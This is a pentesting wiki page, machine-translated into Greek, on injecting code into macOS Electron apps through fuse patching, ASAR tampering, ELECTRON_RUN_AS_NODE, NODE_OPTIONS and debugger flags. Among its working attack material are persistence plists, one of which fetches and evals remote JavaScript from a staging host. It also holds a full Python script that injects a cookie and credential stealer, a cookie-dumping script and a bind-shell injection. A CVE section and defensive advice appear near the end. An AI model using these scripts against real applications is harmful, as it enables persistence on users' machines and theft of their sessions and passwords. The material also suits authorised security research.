# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

Αν δεν ξέρετε τι είναι το Electron, μπορείτε να βρείτε [**πολλές πληροφορίες εδώ**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Αλλά προς το παρόν, απλά να ξέρετε ότι το Electron τρέχει **node**.\
Και το node έχει κάποιες **παραμέτρους** και **μεταβλητές περιβάλλοντος** που μπορούν να χρησιμοποιηθούν για να **εκτελέσουν άλλο κώδικα** εκτός από το υποδεικνυόμενο αρχείο.

### Electron Fuses

Αυτές οι τεχνικές θα συζητηθούν στη συνέχεια, αλλά πρόσφατα το Electron έχει προσθέσει αρκετές **σημαίες ασφαλείας για να τις αποτρέψει**. Αυτές είναι οι [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) και αυτές είναι οι οποίες χρησιμοποιούνται για να **αποτρέψουν** τις εφαρμογές Electron στο macOS από το **να φορτώνουν αυθαίρετο κώδικα**:

- **`RunAsNode`**: Αν είναι απενεργοποιημένο, αποτρέπει τη χρήση της μεταβλητής περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** για την έγχυση κώδικα.
- **`EnableNodeCliInspectArguments`**: Αν είναι απενεργοποιημένο, παράμετροι όπως `--inspect`, `--inspect-brk` δεν θα γίνουν σεβαστοί. Αποφεύγοντας αυτόν τον τρόπο για να εγχέουν κώδικα.
- **`EnableEmbeddedAsarIntegrityValidation`**: Αν είναι ενεργοποιημένο, το φορτωμένο **`asar`** **αρχείο** θα **επικυρωθεί** από το macOS. **Αποτρέποντας** με αυτόν τον τρόπο **την έγχυση κώδικα** τροποποιώντας τα περιεχόμενα αυτού του αρχείου.
- **`OnlyLoadAppFromAsar`**: Αν αυτό είναι ενεργοποιημένο, αντί να ψάχνει να φορτώσει με την εξής σειρά: **`app.asar`**, **`app`** και τελικά **`default_app.asar`**. Θα ελέγξει και θα χρησιμοποιήσει μόνο το app.asar, διασφαλίζοντας έτσι ότι όταν **συνδυάζεται** με τη σημαία **`embeddedAsarIntegrityValidation`** είναι **αδύνατο** να **φορτωθεί μη επικυρωμένος κώδικας**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Αν είναι ενεργοποιημένο, η διαδικασία του προγράμματος περιήγησης χρησιμοποιεί το αρχείο που ονομάζεται `browser_v8_context_snapshot.bin` για το V8 snapshot της.

Μια άλλη ενδιαφέρουσα σημαία που δεν θα αποτρέπει την έγχυση κώδικα είναι:

- **EnableCookieEncryption**: Αν είναι ενεργοποιημένο, το αποθηκευτικό cookie στον δίσκο κρυπτογραφείται χρησιμοποιώντας κλειδιά κρυπτογράφησης επιπέδου OS.

### Checking Electron Fuses

Μπορείτε να **ελέγξετε αυτές τις σημαίες** από μια εφαρμογή με:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Τροποποίηση Ηλεκτρονικών Ασφαλειών

Όπως αναφέρουν οι [**τεκμηριώσεις**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), η διαμόρφωση των **Ηλεκτρονικών Ασφαλειών** είναι ρυθμισμένη μέσα στο **Ηλεκτρονικό δυαδικό** που περιέχει κάπου τη συμβολοσειρά **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Στις εφαρμογές macOS, αυτό είναι συνήθως στο `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Μπορείτε να φορτώσετε αυτό το αρχείο στο [https://hexed.it/](https://hexed.it/) και να αναζητήσετε την προηγούμενη συμβολοσειρά. Μετά από αυτή τη συμβολοσειρά μπορείτε να δείτε σε ASCII έναν αριθμό "0" ή "1" που υποδεικνύει αν κάθε ασφάλεια είναι απενεργοποιημένη ή ενεργοποιημένη. Απλά τροποποιήστε τον κωδικό hex (`0x30` είναι `0` και `0x31` είναι `1`) για **να τροποποιήσετε τις τιμές ασφάλειας**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Σημειώστε ότι αν προσπαθήσετε να **επικαλύψετε** το **`Electron Framework`** δυαδικό αρχείο μέσα σε μια εφαρμογή με αυτούς τους τροποποιημένους byte, η εφαρμογή δεν θα εκτελείται.

## RCE προσθήκη κώδικα σε εφαρμογές Electron

Μπορεί να υπάρχουν **εξωτερικά αρχεία JS/HTML** που χρησιμοποιεί μια εφαρμογή Electron, οπότε ένας επιτιθέμενος θα μπορούσε να εισάγει κώδικα σε αυτά τα αρχεία των οποίων η υπογραφή δεν θα ελεγχθεί και να εκτελέσει αυθαίρετο κώδικα στο πλαίσιο της εφαρμογής.

> [!CAUTION]
> Ωστόσο, αυτή τη στιγμή υπάρχουν 2 περιορισμοί:
>
> - Η άδεια **`kTCCServiceSystemPolicyAppBundles`** είναι **απαραίτητη** για να τροποποιήσετε μια εφαρμογή, οπότε από προεπιλογή αυτό δεν είναι πλέον δυνατό.
> - Το συμπιεσμένο αρχείο **`asap`** συνήθως έχει τις ασφάλειες **`embeddedAsarIntegrityValidation`** `και` **`onlyLoadAppFromAsar`** `ενεργοποιημένες`
>
> Κάνοντάς το αυτό το μονοπάτι επίθεσης πιο περίπλοκο (ή αδύνατο).

Σημειώστε ότι είναι δυνατόν να παρακαμφθεί η απαίτηση της **`kTCCServiceSystemPolicyAppBundles`** αντιγράφοντας την εφαρμογή σε άλλο κατάλογο (όπως **`/tmp`**), μετονομάζοντας τον φάκελο **`app.app/Contents`** σε **`app.app/NotCon`**, **τροποποιώντας** το αρχείο **asar** με τον **κακόβουλο** κώδικά σας, μετονομάζοντάς το πίσω σε **`app.app/Contents`** και εκτελώντας το.

Μπορείτε να αποσυμπιέσετε τον κώδικα από το αρχείο asar με:
```bash
npx asar extract app.asar app-decomp
```
Και συσκευάστε το ξανά αφού το έχετε τροποποιήσει με:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE με ELECTRON_RUN_AS_NODE

Σύμφωνα με [**τα έγγραφα**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), αν αυτή η μεταβλητή περιβάλλοντος είναι ρυθμισμένη, θα ξεκινήσει τη διαδικασία ως μια κανονική διαδικασία Node.js.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Αν η ασφάλεια **`RunAsNode`** είναι απενεργοποιημένη, η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** θα αγνοηθεί και αυτό δεν θα λειτουργήσει.

### Εισαγωγή από το App Plist

Όπως [**προτείνεται εδώ**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), μπορείτε να εκμεταλλευτείτε αυτή τη μεταβλητή περιβάλλοντος σε ένα plist για να διατηρήσετε την επιμονή:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE με `NODE_OPTIONS`

Μπορείτε να αποθηκεύσετε το payload σε ένα διαφορετικό αρχείο και να το εκτελέσετε:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Αν η ασφάλεια **`EnableNodeOptionsEnvironmentVariable`** είναι **απενεργοποιημένη**, η εφαρμογή θα **αγνοήσει** τη μεταβλητή περιβάλλοντος **NODE_OPTIONS** όταν εκκινείται, εκτός αν η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** είναι ρυθμισμένη, η οποία θα **αγνοηθεί** επίσης αν η ασφάλεια **`RunAsNode`** είναι απενεργοποιημένη.
>
> Αν δεν ρυθμίσετε **`ELECTRON_RUN_AS_NODE`**, θα βρείτε το **σφάλμα**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection from the App Plist

Μπορείτε να εκμεταλλευτείτε αυτή τη μεταβλητή περιβάλλοντος σε ένα plist για να διατηρήσετε την επιμονή προσθέτοντας αυτά τα κλειδιά:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE με επιθεώρηση

Σύμφωνα με [**αυτό**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), αν εκτελέσετε μια εφαρμογή Electron με σημαίες όπως **`--inspect`**, **`--inspect-brk`** και **`--remote-debugging-port`**, μια **θύρα αποσφαλμάτωσης θα είναι ανοιχτή** ώστε να μπορείτε να συνδεθείτε σε αυτή (για παράδειγμα από το Chrome στο `chrome://inspect`) και θα μπορείτε να **εισάγετε κώδικα σε αυτή** ή ακόμα και να εκκινήσετε νέες διαδικασίες.\
Για παράδειγμα:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
In [**αυτή την ανάρτηση**](https://hackerone.com/reports/1274695), αυτή η αποσφαλμάτωση κακοποιείται για να κάνει ένα headless chrome **να κατεβάσει αυθαίρετα αρχεία σε αυθαίρετες τοποθεσίες**.

> [!TIP]
> Αν μια εφαρμογή έχει τον δικό της τρόπο να ελέγξει αν οι μεταβλητές περιβάλλοντος ή οι παράμετροι όπως το `--inspect` είναι ρυθμισμένες, θα μπορούσατε να προσπαθήσετε να **παρακάμψετε** το κατά την εκτέλεση χρησιμοποιώντας την παράμετρο `--inspect-brk`, η οποία θα **σταματήσει την εκτέλεση** στην αρχή της εφαρμογής και θα εκτελέσει μια παράκαμψη (υπεργράφοντας τις παραμέτρους ή τις μεταβλητές περιβάλλοντος της τρέχουσας διαδικασίας για παράδειγμα).

Η παρακάτω ήταν μια εκμετάλλευση που παρακολουθώντας και εκτελώντας την εφαρμογή με την παράμετρο `--inspect-brk`, ήταν δυνατό να παρακαμφθεί η προσαρμοσμένη προστασία που είχε (υπεργράφοντας τις παραμέτρους της διαδικασίας για να αφαιρεθεί το `--inspect-brk`) και στη συνέχεια να εγχυθεί ένα JS payload για να απορρίψει cookies και διαπιστευτήρια από την εφαρμογή:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Αν η ασφάλεια **`EnableNodeCliInspectArguments`** είναι απενεργοποιημένη, η εφαρμογή θα **αγνοήσει τις παραμέτρους node** (όπως `--inspect`) όταν εκκινείται, εκτός αν η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** είναι ρυθμισμένη, η οποία θα **αγνοηθεί** επίσης αν η ασφάλεια **`RunAsNode`** είναι απενεργοποιημένη.
>
> Ωστόσο, μπορείτε να χρησιμοποιήσετε την **παράμετρο electron `--remote-debugging-port=9229`** αλλά το προηγούμενο payload δεν θα λειτουργήσει για την εκτέλεση άλλων διαδικασιών.

Χρησιμοποιώντας την παράμετρο **`--remote-debugging-port=9222`** είναι δυνατόν να κλέψετε κάποιες πληροφορίες από την εφαρμογή Electron όπως το **ιστορικό** (με εντολές GET) ή τα **cookies** του προγράμματος περιήγησης (καθώς είναι **αποκρυπτογραφημένα** μέσα στο πρόγραμμα περιήγησης και υπάρχει ένα **json endpoint** που θα τα δώσει).

Μπορείτε να μάθετε πώς να το κάνετε αυτό [**εδώ**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) και [**εδώ**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) και να χρησιμοποιήσετε το αυτόματο εργαλείο [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ή ένα απλό σενάριο όπως:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection from the App Plist

Μπορείτε να εκμεταλλευτείτε αυτήν την env μεταβλητή σε ένα plist για να διατηρήσετε την επιμονή προσθέτοντας αυτά τα κλειδιά:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusing Older Versions

> [!TIP]
> Ο δαίμονας TCC από το macOS δεν ελέγχει την εκτελούμενη έκδοση της εφαρμογής. Έτσι, αν **δεν μπορείτε να εισάγετε κώδικα σε μια εφαρμογή Electron** με καμία από τις προηγούμενες τεχνικές, μπορείτε να κατεβάσετε μια προηγούμενη έκδοση της ΕΦΑΡΜΟΓΗΣ και να εισάγετε κώδικα σε αυτήν, καθώς θα αποκτήσει ακόμα τα δικαιώματα TCC (εκτός αν το Trust Cache το αποτρέψει).

## Run non JS Code

Οι προηγούμενες τεχνικές θα σας επιτρέψουν να εκτελέσετε **κώδικα JS μέσα στη διαδικασία της εφαρμογής electron**. Ωστόσο, θυμηθείτε ότι οι **παιδικές διαδικασίες εκτελούνται υπό το ίδιο προφίλ sandbox** με την γονική εφαρμογή και **κληρονομούν τα δικαιώματα TCC τους**.\
Επομένως, αν θέλετε να εκμεταλλευτείτε τα δικαιώματα για να αποκτήσετε πρόσβαση στην κάμερα ή το μικρόφωνο, για παράδειγμα, μπορείτε απλά να **εκτελέσετε ένα άλλο δυαδικό από τη διαδικασία**.

## Notable Electron macOS Vulnerabilities (2023-2024)

### CVE-2023-44402 – ASAR integrity bypass

Οι Electron ≤22.3.23 και διάφορες προ-εκδόσεις 23-27 επέτρεπαν σε έναν επιτιθέμενο με δικαιώματα εγγραφής στον φάκελο `.app/Contents/Resources` να παρακάμψει τις ασφάλειες `embeddedAsarIntegrityValidation` **και** `onlyLoadAppFromAsar`. Το σφάλμα ήταν μια *σύγχυση τύπου αρχείου* στον ελεγκτή ακεραιότητας που επέτρεπε σε έναν κατασκευασμένο **φάκελο ονόματι `app.asar`** να φορτωθεί αντί του επικυρωμένου αρχείου, έτσι οποιοσδήποτε JavaScript τοποθετηθεί μέσα σε αυτόν τον φάκελο εκτελούνταν όταν ξεκινούσε η εφαρμογή. Ακόμα και οι προμηθευτές που είχαν ακολουθήσει τις οδηγίες σκληρής ασφάλισης και είχαν ενεργοποιήσει και τις δύο ασφάλειες ήταν επομένως ακόμα ευάλωτοι στο macOS.

Διορθωμένες εκδόσεις Electron: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** και **27.0.0-alpha.7**. Οι επιτιθέμενοι που βρίσκουν μια εφαρμογή που εκτελεί παλαιότερη έκδοση μπορούν να αντικαταστήσουν το `Contents/Resources/app.asar` με τον δικό τους φάκελο για να εκτελέσουν κώδικα με τα δικαιώματα TCC της εφαρμογής.

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE cluster

Τον Ιανουάριο του 2024, μια σειρά από CVEs (CVE-2024-23738 έως CVE-2024-23743) ανέδειξαν ότι πολλές εφαρμογές Electron αποστέλλονται με τις ασφάλειες **RunAsNode** και **EnableNodeCliInspectArguments** ακόμα ενεργοποιημένες. Ένας τοπικός επιτιθέμενος μπορεί επομένως να επανεκκινήσει το πρόγραμμα με τη μεταβλητή περιβάλλοντος `ELECTRON_RUN_AS_NODE=1` ή με σημαίες όπως `--inspect-brk` για να το μετατρέψει σε μια *γενική* διαδικασία Node.js και να κληρονομήσει όλα τα δικαιώματα sandbox και TCC της εφαρμογής.

Αν και η ομάδα της Electron αμφισβήτησε την "κρίσιμη" βαθμολογία και σημείωσε ότι ένας επιτιθέμενος χρειάζεται ήδη τοπική εκτέλεση κώδικα, το ζήτημα είναι ακόμα πολύτιμο κατά τη διάρκεια της μετα-εκμετάλλευσης, καθώς μετατρέπει οποιοδήποτε ευάλωτο πακέτο Electron σε ένα *living-off-the-land* δυαδικό που μπορεί π.χ. να διαβάσει Επαφές, Φωτογραφίες ή άλλους ευαίσθητους πόρους που είχαν προηγουμένως παραχωρηθεί στην επιτραπέζια εφαρμογή.

Αμυντικές οδηγίες από τους συντηρητές της Electron:

* Απενεργοποιήστε τις ασφάλειες `RunAsNode` και `EnableNodeCliInspectArguments` σε παραγωγικές εκδόσεις.
* Χρησιμοποιήστε το νεότερο **UtilityProcess** API αν η εφαρμογή σας χρειάζεται νόμιμα μια βοηθητική διαδικασία Node.js αντί να επανενεργοποιήσετε αυτές τις ασφάλειες.

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Το εργαλείο [**electroniz3r**](https://github.com/r3ggi/electroniz3r) μπορεί να χρησιμοποιηθεί εύκολα για να **βρείτε ευάλωτες εφαρμογές electron** που είναι εγκατεστημένες και να εισάγετε κώδικα σε αυτές. Αυτό το εργαλείο θα προσπαθήσει να χρησιμοποιήσει την τεχνική **`--inspect`**:

Πρέπει να το συντάξετε μόνοι σας και μπορείτε να το χρησιμοποιήσετε έτσι:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Το Loki σχεδιάστηκε για να δημιουργεί backdoor σε εφαρμογές Electron αντικαθιστώντας τα αρχεία JavaScript των εφαρμογών με τα αρχεία JavaScript του Loki Command & Control.


## Αναφορές

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [https://www.electronjs.org/blog/statement-run-as-node-cves](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
